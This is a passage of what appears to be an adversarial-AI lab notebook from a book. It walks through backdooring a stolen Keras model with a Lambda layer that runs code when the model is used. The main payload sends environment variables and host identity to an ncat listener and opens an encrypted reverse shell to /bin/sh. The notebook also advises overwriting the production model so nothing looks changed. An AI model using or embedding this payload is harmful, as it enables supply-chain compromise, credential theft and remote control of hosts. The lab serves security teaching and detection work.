       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │         <span style=\"color: #00af00; text-decoration-color: #00af00\">2,112</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ malicious_layer (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Lambda</span>)        │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │             <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m32\u001b[0m)             │           \u001b[38;5;34m256\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │         \u001b[38;5;34m2,112\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ malicious_layer (\u001b[38;5;33mLambda\u001b[0m)        │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │             \u001b[38;5;34m0\u001b[0m │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">7,301</span> (28.52 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m7,301\u001b[0m (28.52 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Optimizer params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">4,868</span> (19.02 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Optimizer params: \u001b[0m\u001b[38;5;34m4,868\u001b[0m (19.02 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 66ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.15068795]], dtype=float32)"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Validate that the pwned layer has been added to the model\n",
    "Look at the last layer, you see we have added our malicious layer\n",
    "Also this last layer has no parameters but has 1 neuron\n",
    "We are simply taking the results from the last layer and passing it to the malicious layer\n",
    "If you remember in the function, we define a parameter *incoming_tensor*\n",
    "This parameter is the tensor\n",
    "'''\n",
    "loaded_model.summary()\n",
    "\n",
    "#Validate the model csn still make predictions before saving it\n",
    "#Everything is working as expected\n",
    "loaded_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4625fde5",
   "metadata": {},
   "source": [
    "We see above the malicious lambda layer has been added to the stolen model.   \n",
    "We also see that the model is still able to make inferences, via the model's predict method.  \n",
    "With this inplace, and the fact that we know it is working, all that has to be done now is save the model, setup our infrastructure to accept incoming connection and then we are good to go. Assume that everything continues to work well.   \n",
    "For the purpose of this book, we simply stored the compromised model with a new name. In production, the threat actor would overwrite the existing model to ensure everything *looks* the same. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "f1c520f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save the compromised model\n",
    "tf.keras.models.save_model(model=loaded_model, filepath=r'/tmp/zeek_pwnd.keras', overwrite=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "80a78063",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/mnt/d/Little Book on Adversarial AI/labs\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "What happens when we load the model to make a prediction?\n",
    "Notice, simply loading the model executed our code\n",
    "Once again, do remember, our command was simply *pwd* to print the working directory\n",
    "This is the results we see below\n",
    "Notice below, we also specified *safe_mode* to True and still we are able to execute this arbitrary code\n",
    "'''\n",
    "pwnd_zeek_model = tf.keras.models.load_model(filepath='/tmp/zeek_pwnd.keras', safe_mode=True)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "837c1b7d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/mnt/d/Little Book on Adversarial AI/labs\n",
      "WARNING:tensorflow:5 out of the last 7 calls to <function TensorFlowTrainer.make_predict_function.<locals>.one_step_on_data_distributed at 0x7f6754b4a700> triggered tf.function retracing. Tracing is expensive and the excessive number of tracings could be due to (1) creating @tf.function repeatedly in a loop, (2) passing tensors with different shapes, (3) passing Python objects instead of tensors. For (1), please define your @tf.function outside of the loop. For (2), @tf.function has reduce_retracing=True option that can avoid unnecessary retracing. For (3), please refer to https://www.tensorflow.org/guide/function#controlling_retracing and https://www.tensorflow.org/api_docs/python/tf/function for  more details.\n",
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 274ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.15068795]], dtype=float32)"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# make a prediction with the loaded model, to confirm it works as expected\n",
    "# We need the end user to not suspect there is a problem\n",
    "pwnd_zeek_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cbc765e4",
   "metadata": {},
   "source": [
    "### Real world compromise   \n",
    "Now that we have an understanding of how to work with the Lambda layer, let's transition to an actual real world scenario.  \n",
    "\n",
    "This next section is from a scenario that actually occurred in the real-world, with slight modification. Sometime between May 14 and 24, 2202, threat actors took over the CTX project which is hosted on PyPi and replaced it with a malicious project. The malicious project had code that collected information from environment variables, etc., base64 encoded it and then exfiltrate to a remote site. \n",
    "\n",
    "Here are some links on the issue:  \n",
    "- https://github.com/advisories/GHSA-4g82-3jcr-q52w  \n",
    "- https://isc.sans.edu/diary/ctx+Python+Library+Updated+with+Extra+Features/28678  \n",
    "- https://github.com/Azure/counterfit/wiki/Abusing-ML-model-file-formats-to-create-malware-on-AI-systems:-A-proof-of-concept   \n",
    "\n",
    "Let now build out the scenario for our problem      \n",
    "\n",
    "### Step 10:   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f524c5ee",
   "metadata": {},
   "source": [
    "### Setup a HTTP Server   \n",
    "Let us setup an HTTP server that simulates us waiting for incoming connections. This needs to be done in your WSL or Linux environment   \n",
    "- We will use ncat to listen on port 9999.   \n",
    "- We will also encrypt the traffic to make this a bit harder for detection   \n",
    "- Because ncat tears the connection down once the client closes it, we will make this persistent by using the  --keep-open option\n",
    "\n",
    "\n",
    "$ **ncat --verbose --listen 9999 --ssl --keep-open**   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "7ac763bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "Let's make this a bit more interesting. \n",
    "First setup a function to use with lambda. As we learned above, the lambda layer needs a custom function\n",
    "Rather than using *def* to setup a function, let us use the python lambda \n",
    "our function is named *attack_fn* \n",
    "The exec function always return None.\n",
    "Hence the x is the incoming tensor and it would pass through unchanged.\n",
    "'''\n",
    "\n",
    "#@tf.keras.utils.register_keras_serializable(package=\"ctx_inspired_attack\", name=\"ctx_inspired_attack\")\n",
    "attack_fn = lambda x: exec(\"\"\"\n",
    "# Import the libraries\n",
    "import http.client\n",
    "import ssl\n",
    "import json\n",
    "import getpass\n",
    "import socket\n",
    "import subprocess as sp\n",
    "\n",
    "# Setup a HTTP connection. \n",
    "# You could change 127.0.0.1 to whatever you wish, assuming you setup your ncat listener on that IP\n",
    "# If we get any certificate errors, we want to continue                     \n",
    "conn = http.client.HTTPSConnection('127.0.0.1', 9999, context=ssl._create_unverified_context(ssl.PROTOCOL_TLSv1_2))\n",
    "\n",
    "# Setup the connection to exfiltrate some information, create a backdoor from the HTTP connection via the body of the HTML\n",
    "conn.request(method='POST', url=f'/{getpass.getuser()}/{socket.gethostname()}/{socket.gethostbyname(socket.gethostname())}', body=f'{json.dumps(dict(os.environ))} ------- {sp.Popen([\"ncat\", \"--verbose\", \"127.0.0.1\", \"9999\", \"--exec\", \"/bin/sh\", \"--ssl\"])}', headers={'Content-Type' : 'application/json', 'User-Agent' : 'SecurityNik'})\n",
    "\"\"\") or x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "9848acd7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:6 out of the last 8 calls to <function TensorFlowTrainer.make_predict_function.<locals>.one_step_on_data_distributed at 0x7f67549bc040> triggered tf.function retracing. Tracing is expensive and the excessive number of tracings could be due to (1) creating @tf.function repeatedly in a loop, (2) passing tensors with different shapes, (3) passing Python objects instead of tensors. For (1), please define your @tf.function outside of the loop. For (2), @tf.function has reduce_retracing=True option that can avoid unnecessary retracing. For (3), please refer to https://www.tensorflow.org/guide/function#controlling_retracing and https://www.tensorflow.org/api_docs/python/tf/function for  more details.\n",
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 258ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.15068795]], dtype=float32)"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let us load the model\n",
    "# Note this is back to the original model that we created, saved and imported\n",
    "# This is the clean model in the victim environment\n",
    "loaded_model = tf.keras.models.load_model(filepath='/tmp/zeek_model.keras')\n",
    "\n",
    "# make a prediction with the loaded model, to confirm it works as expected\n",
    "loaded_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3518db01",
   "metadata": {},
   "source": [
    "With the model loaded, let us once again leverage the Lambda layer. We add our malicious layer to the loaded model.   \n",
    "\n",
    "### Step 11:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "77da94c8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Lambda name=attack_fn, built=False>"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Like we did earlier, let's leverage the keras Lambda layer to compromise this model\n",
    "# We first create our attack_layer\n",
    "ctx_attack_layer = tf.keras.layers.Lambda(function=attack_fn, name='attack_fn')\n",
    "ctx_attack_layer\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "13c28d61",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">32</span>)             │           <span style=\"color: #00af00; text-decoration-color: #00af00\">256</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │         <span style=\"color: #00af00; text-decoration-color: #00af00\">2,112</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ attack_fn (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Lambda</span>)              │ ?                      │             <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m32\u001b[0m)             │           \u001b[38;5;34m256\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │         \u001b[38;5;34m2,112\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ attack_fn (\u001b[38;5;33mLambda\u001b[0m)              │ ?                      │             \u001b[38;5;34m0\u001b[0m │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">7,301</span> (28.52 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m7,301\u001b[0m (28.52 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Optimizer params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">4,868</span> (19.02 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Optimizer params: \u001b[0m\u001b[38;5;34m4,868\u001b[0m (19.02 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Modify the stolen model\n",
    "# Add the malicious layer to the victim model\n",
    "loaded_model.add(ctx_attack_layer)\n",
    "loaded_model.summary()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39f83b5b",
   "metadata": {},
   "source": [
    "Let us save the model back to the file system and then load it. During loading, the malicious code should be executed. \n",
    "\n",
    "**Remember to have your ncat listener running**   \n",
    "\n",
    "### Step 12:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "358267cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n",
      "Ncat: Subject: CN=localhost\n",
      "Ncat: Issuer: CN=localhost\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n",
      "Ncat: Certificate verification failed (self-signed certificate).\n",
      "Ncat: SSL connection to 127.0.0.1:9999.\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 274ms/step"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n",
      "Ncat: Subject: CN=localhost\n",
      "Ncat: Issuer: CN=localhost\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n",
      "Ncat: Certificate verification failed (self-signed certificate).\n",
      "Ncat: SSL connection to 127.0.0.1:9999.\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 309ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.15068795]], dtype=float32)"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We can see above that it works, so we just save the model again\n",
    "\n",
    "# Save the compromised model\n",
    "tf.keras.models.save_model(model=loaded_model, filepath=r'/tmp/zeek_pwnd_ctx.keras', overwrite=True)\n",
    "\n",
    "# Notice in this case, whereas above in the previous lab we had safe_mode=True and the attack still worked, in this case, we need safe_mode=False. \n",
    "pwnd_zeek_ctx_model = tf.keras.models.load_model(filepath='/tmp/zeek_pwnd_ctx.keras', safe_mode=False)\n",
    "\n",
    "# Most importantly, our attack works and the compromised model can still make predictions\n",
    "pwnd_zeek_ctx_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8accf10",
   "metadata": {},
   "source": [
    "### Success!  \n",
    "If everything worked according to plan, we should be able to see the following in our ncat session:  \n",
    "- Information for the environment, similar to what you would see if you ran *env* in your terminal   \n",
    "- you might not recognize it, but you should also now have a *shell*   \n",
    "    - Type any of the following commands in your *ncat* window:   \n",
    "        - ls   \n",
    "        - pwd   \n",
    "        - cat /etc/passwd   \n",
    "        - whoami \n",
    "        - id "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a1d11539",
   "metadata": {},
   "source": [
    "### Lab takeaways:  \n",
    "This was our first attempt with truly leveraging adversarial AI. Here is what we achieved:  \n",
    "- We stole a model. The victim model   \n",
    "- Leveraged the Keras Lambda layer to insert a malicious layer in the victim model   \n",
    "- We leveraged ncat to setup a HTTP connection that is encrypted  \n",
    "- We exfiltrated data about the environment variables   \n",
    "- FINALLY! We got shell on the host! Yayy! \n",
    "\n",
    "That is a great start so far and it lays the foundation for where we are going with the rest of these notebooks and the associated PDF book. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6581dfdf",
   "metadata": {},
   "source": [
    "### I know you are excited, but sorry, we are not done yet :-D   \n",
    "We are working inside of out  notebook. Will this work outside of this notebook? It's worth a test.   \n",
    "If you closed off your previous *ncat* session restart it:  \n",
    "    **ncat --verbose --listen 9999 --ssl --keep-open**\n",
    "\n",
    "Let's also validate this works outside of our notebook. \n",
    "1. Open your annaconda prompt   \n",
    "2. Switch to your adversarial_ai environment\n",
    "    conda activate adversarial_ai\n",
    "3. run python3\n",
    "4. import tensorflow \n",
    "    import tensorflow as tf\n",
    "5. load the model\n",
    "    pwnd_zeek_ctx_model = tf.keras.models.load_model(filepath='/tmp/zeek_pwnd_ctx.keras', safe_mode=False)\n",
    "\n",
    "Above should execute without any issues. When you look at your ncat listener, you should have full access to the system which loaded the model, similar to before.\n",
    "\n",
    "### Now we are almost done!\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d0b85695",
   "metadata": {},
   "source": [
    "# Detecting this activity  \n",
    "It is very nice that we know how to perform that attack using adversarial AI. However, I work in a SOC, so detection is a must (where possible).  \n",
    "Let's see if we can detect this threat    \n",
    "\n",
    "\n",
    "### Step 13:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "707835ff",
   "metadata": {},
   "source": [
    "- So far here, we were able to add a malicious layer and achieve a specific objective. However, in production, one of the ways organization use the model for inference, is to call a script that loads the model and make inferences. If we try to operate outside of their script, our code will not run effectively. As a result, we need not only to steal the model like we did earlier, but also gain access to the code that calls the models and makes inferences.\n",
    "\n",
    "To get a better understanding, of the issues and why we need to gain access to the script that calls the model in the client's environment, complete the task below.\n",
    "\n",
    "To prove the point above, open a terminal and load python\n",
    "$python3   \n",
    "\n",
    "Then load the model  \n",
    ">>> import tensorflow as tf   \n",
    ">>> tf.keras.models.load_model(filepath='/tmp/zeek_pwnd.keras', safe_mode=True)   \n",
    "\n",
    "The above will more than likely throw an error about custom object not being registered. *... Exception encountered: Could not locate function 'malicious_payload>malicious_payload'. Make sure custom classes are decorated with `@keras.saving.register_keras_serializable() ...*\n",
    "\n",
    "The whole issue comes back to saving and loading the custom objects that we define. \n",
    "\n",
    "This error should be enough for the team managing this environment to look into what the issue is. Maybe the will detect the issue maybe the won't. At least we know there is an error that can be leveraged.  \n",
    "\n",
    "\n",
    "### Let's transition to where we are able to manipulate the organization's inference script also.   \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "a8cbef95",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2025-08-01 20:42:26.581395: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.\n",
      "2025-08-01 20:42:26.599090: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:467] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\n",
      "WARNING: All log messages before absl::InitializeLog() is called are written to STDERR\n",
      "E0000 00:00:1754095346.636927    7789 cuda_dnn.cc:8579] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\n",
      "E0000 00:00:1754095346.647527    7789 cuda_blas.cc:1407] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n",
      "W0000 00:00:1754095346.677696    7789 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095346.677821    7789 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095346.677834    7789 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095346.677840    7789 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "2025-08-01 20:42:26.687972: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 AVX512F AVX512_VNNI AVX512_BF16 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "\u001b[H\u001b[2JNumber of arguments passed: 2\n",
      "**************************************************\n",
      "Ready to make your predictions!\n",
      "**************************************************\n",
      "Loading model... /tmp/zeek_pwnd.keras\n",
      "W0000 00:00:1754095353.660253    7789 gpu_device.cc:2430] TensorFlow was not built with CUDA kernel binaries compatible with compute capability 12.0. CUDA kernels will be jit-compiled from PTX, which could take 30 minutes or longer.\n",
      "W0000 00:00:1754095353.678939    7789 gpu_device.cc:2430] TensorFlow was not built with CUDA kernel binaries compatible with compute capability 12.0. CUDA kernels will be jit-compiled from PTX, which could take 30 minutes or longer.\n",
      "I0000 00:00:1754095354.224584    7789 gpu_device.cc:2019] Created device /job:localhost/replica:0/task:0/device:GPU:0 with 13159 MB memory:  -> device: 0, name: NVIDIA GeForce RTX 5080 Laptop GPU, pci bus id: 0000:64:00.0, compute capability: 12.0\n",
      "2025-08-01 20:42:34.236192: W tensorflow/compiler/mlir/tools/kernel_gen/tf_gpu_runtime_wrappers.cc:40] 'cuModuleLoadData(&module, data)' failed with 'CUDA_ERROR_INVALID_PTX'\n",
      "\n",
